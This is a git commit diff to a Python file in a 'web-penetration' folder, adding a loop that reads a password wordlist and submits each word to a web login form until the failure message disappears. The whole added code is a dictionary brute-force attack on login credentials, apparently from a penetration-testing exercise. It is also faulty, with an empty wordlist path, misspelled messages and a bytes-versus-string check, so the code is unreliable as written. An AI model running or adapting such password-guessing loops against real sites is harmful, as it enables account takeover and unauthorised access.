cf4caa2ed49a8ed02f05d364e360779b2fdadf37
Jean Andrew Fuentes <jeanandrewfuentes@gmail.com>
2020-05-06 20:37:58 +0800

    Add loop for password list

--- web-penetration/post.py
+++ web-penetration/post.py
@@ -12,3 +12,15 @@ data_dict = {
 
 response = requests.post(target_url, data_dict)
 print(response.content)
+
+password_list=""
+with open(password_list, 'r') as wordlist_file:
+    for line in wordlist_file:
+        word = line.strip()
+        data_dict['password'] = word
+        response = requests.post(target_url, data=data_dict)
+        if "Login faled" not in response.content:
+            print('[+] Got Password ----> {}'.format(word))
+            exit()
+
+print("[+] Reached and of line")
